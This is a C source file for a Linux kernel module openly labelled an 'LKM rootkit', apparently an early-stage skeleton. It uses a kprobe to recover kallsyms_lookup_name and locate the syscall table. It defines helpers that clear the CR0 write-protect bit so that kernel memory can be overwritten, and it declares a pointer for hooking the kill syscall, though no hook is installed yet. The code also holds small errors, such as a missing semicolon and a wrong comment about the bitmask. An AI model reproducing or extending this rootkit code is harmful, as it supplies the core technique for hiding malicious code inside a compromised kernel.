#include <linux/init.h>     //used for things like __init and __exit
#include <linux/module.h>   //load the module into kernel
#include <linux/kernel.h>    //kernel functions
#include <linux/kallsyms.h>     //capture this so I know where to grab addresses from
#include <linux/kprobes.h>      //needed for kallsyms_lookup on linux kernel 5.7+
#include <linux/unistd.h>       //defines syscall numbers
#include <linux/version.h>      // Linux kernel versions
#include <asm/paravirt.h>       //needed to read the cr0 register

//for use with later if rootkit is modified to work with earlier linux
#define PTREGS_SYSCALL_STUB 1

//syscalls start with asmlinkage
//function pointer
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs)
static ptregs_t orig_kill;



//modifying kprobe. filling out name here
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};


/*
CR0 is x86 control register. Now write protection to stop rootkits from using write_cr0.
But we can make our own version to still be able to do it.
Going to create three functions to manipulate cr0
*/
static inline void write_cr0_force(unsigned long val)
{
    unsigned long __force_order;

    //some asm to perform what the older, unprotected write cr0 would do
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));    
}
// should disable the write protection
static void unprotect_memory(void)
{
    // sets bits from 0x10000 to 0x01111
    write_cr0_force(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "memory is unprotected\n");
}
// should enable write protection
static void protect_memory(void)
{
    write_cr0_force(read_cr0() | (0x10000));
    printk(KERN_INFO "memory is protected\n");
}

//when the rootkit gets closed
static void __exit mod_exit(void)
{
    //print to dmesg
    printk(KERN_INFO "rootkit exited\n");
}

//main but kernel level so mod_init
static int __init mod_init(void)
{
    //print to dmesg
    printk(KERN_INFO "rootkit initialized\n");

    //returns starting address of syscalltable
    unsigned long* sys_call_table;

    //kprobe needed to access table as table is no longer exported in newer linux
    printk(KERN_INFO "registering kprobe..\n");
    if (register_kprobe(&kp) < 0)
    {
        printk("Could not register kprobe\n");
        return 1;
    }
    printk(KERN_INFO "register kprobe success\n");

    //create types to handle data
    typedef unsigned long(*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    //close out kprobe now that i'm done with it    
    unregister_kprobe(&kp);

    sys_call_table = (unsigned long*) kallsyms_lookup_name("sys_call_table");
    if(!sys_call_table)
    {
        printk(KERN_INFO "Sys call table not found.. exiting");
        return 1;
    }
    printk(KERN_INFO "sys call table found\n");



    return 0;
}

//tell it where to go insmod
module_init(mod_init);

//tell it where to go on rmmod
module_exit(mod_exit);

//needed for module build. removed taint dmesg message
MODULE_LICENSE("GPL");  //required by gcc to build
MODULE_DESCRIPTION("LKM rootkit");
MODULE_VERSION("0.0.1");
